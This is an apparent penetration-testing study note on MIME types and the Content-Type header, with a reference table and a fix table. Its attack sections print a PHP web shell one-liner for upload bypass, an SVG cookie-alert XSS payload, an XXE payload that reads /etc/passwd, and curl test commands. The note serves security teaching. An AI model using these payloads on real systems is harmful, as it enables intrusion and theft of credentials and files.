---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.14 MIME Types and Content-Type"
---

# 02.14 — MIME Types and Content-Type

## What is it?

**MIME type** (Multipurpose Internet Mail Extensions) identifies the format of data. In HTTP, the `Content-Type` header tells both client and server what type of data is in the request/response body. Mishandling or ignoring Content-Type leads to multiple vulnerability classes.

---

## Content-Type Format

```
Content-Type: type/subtype; parameter=value

Examples:
  Content-Type: text/html; charset=UTF-8
  Content-Type: application/json
  Content-Type: application/x-www-form-urlencoded
  Content-Type: multipart/form-data; boundary=----WebKitBoundaryXXX
  Content-Type: image/jpeg
  Content-Type: application/octet-stream
  Content-Type: application/xml
  Content-Type: text/plain; charset=UTF-8
```

---

## Common MIME Types Reference

```
CATEGORY     MIME TYPE                        EXTENSION
──────────────────────────────────────────────────────────────
Text         text/html                        .html, .htm
             text/css                         .css
             text/javascript (deprecated)     .js
             application/javascript           .js
             text/plain                       .txt
             text/csv                         .csv
             text/xml                         .xml

Images       image/jpeg                       .jpg, .jpeg
             image/png                        .png
             image/gif                        .gif
             image/svg+xml                    .svg   ← XSS risk!
             image/webp                       .webp

Documents    application/pdf                  .pdf
             application/zip                  .zip
             application/x-tar               .tar
             application/vnd.ms-excel        .xls
             application/vnd.openxmlformats-officedocument.spreadsheetml.sheet .xlsx

Data/API     application/json                (APIs)
             application/xml                 (XML APIs)
             application/x-www-form-urlencoded (HTML forms)
             multipart/form-data             (file uploads)
             application/octet-stream        (binary/unknown)

Execution    application/x-httpd-php         .php
             application/x-sh               .sh
             application/java-archive        .jar
```

---

## Security Context — Content-Type in VAPT

### 1. MIME Sniffing — Browser Override

```
If server sends wrong Content-Type (or none), browsers may "sniff" the actual content type.

Server: Content-Type: text/plain
Response body: <script>alert(1)</script>

CHROME: (historically) "This looks like HTML, I'll render it as HTML!"
→ XSS executes even though Content-Type said text/plain!

DEFENSE: X-Content-Type-Options: nosniff
→ Browser must use declared Content-Type, no sniffing

TEST:
curl -sI https://target.com/file.txt | grep -i "x-content-type\|content-type"
# Missing X-Content-Type-Options? → MIME sniffing possible
```

### 2. File Upload — Content-Type Bypass

```
Server checks Content-Type header to validate file type.
Attacker changes Content-Type to bypass:

LEGITIMATE UPLOAD:
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg    ← legitimate type

[JPEG binary data]

MALICIOUS UPLOAD (change Content-Type in Burp):
------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← lie about type!

<?php system($_GET['cmd']); ?>   ← actual content is PHP!

If server only checks Content-Type header → BYPASS!
Server saves as .php → execute at /uploads/shell.php?cmd=id
```

### 3. Content-Type Confusion — JSON vs Form

```
API endpoint expects JSON but processes BOTH:
  
NORMAL JSON:
POST /api/login HTTP/1.1
Content-Type: application/json
{"username":"admin","password":"test"}

SWITCH TO FORM:
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=admin&password=test

WHY THIS MATTERS:
- JSON parsers may have different validation than form parsers
- CSRF token not required for JSON (traditionally) but IS required for form?
- XSS filters may process JSON differently than form data
- Type confusion can bypass CSRF protection, security checks
```

### 4. SVG — Image MIME with Script

```
SVG files are XML → can contain JavaScript!

MALICIOUS SVG:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.cookie)</script>
</svg>

If served as image/svg+xml → browser executes the JS!

ATTACK SCENARIOS:
1. Upload SVG as "avatar" → browser loads SVG → XSS!
2. File inclusion of SVG → XSS
3. Link to uploaded SVG → XSS

BYPASS: Change file extension to .svg but content-type check may pass
since SVG is a "valid image" format.
```

### 5. XXE via Content-Type Switch

```
API normally receives JSON → no XXE risk.
But what if you switch to XML?

NORMAL:
POST /api/parse HTTP/1.1
Content-Type: application/json
{"data":"value"}

ATTACK:
POST /api/parse HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

If server also handles XML (dual content-type support) → XXE!
```

### 6. Content-Type and CORS

```
CORS "simple requests" (no preflight) include:
  application/x-www-form-urlencoded
  multipart/form-data
  text/plain

"Non-simple" Content-Types trigger CORS preflight:
  application/json
  application/xml
  text/xml
  Custom types

ATTACK: CORS bypass by changing Content-Type
If API only validates CORS for "simple" types but processes all types:
  POST with text/plain that contains JSON → bypasses CORS preflight!
```

---

## Hands-On: Content-Type Testing

```bash
# Test what Content-Types server accepts
for ct in "application/json" "application/xml" "text/xml" "text/plain" \
           "application/x-www-form-urlencoded" "multipart/form-data"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: $ct" -d '{"test":"value"}' \
    https://target.com/api/data)
  echo "$ct → $code"
done

# Upload SVG as image
curl -X POST https://target.com/upload \
  -F "image=@malicious.svg;type=image/jpeg;filename=photo.jpg" \
  -H "Cookie: session=abc"

# Check if response has X-Content-Type-Options
curl -sI https://target.com | grep -i x-content-type

# Change Content-Type in Burp Suite:
# Repeater → change Content-Type header → send → observe response
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| MIME sniffing | Add X-Content-Type-Options: nosniff |
| Content-Type bypass in file upload | Check file magic bytes (real content), not just headers |
| SVG XSS | Serve SVG from separate domain with CSP, or rasterize to PNG |
| XXE via Content-Type switch | Disable external entity processing in all parsers |
| Missing Content-Type on responses | Always set Content-Type explicitly |

---

## Related Notes
- [[Module 15 - File Upload]] — file upload with MIME bypass
- [[Module 14 - XXE]] — XXE via XML Content-Type
- [[Module 02 - XSS]] — SVG XSS
- [[Module 03 - HTTP Headers Security]] — X-Content-Type-Options
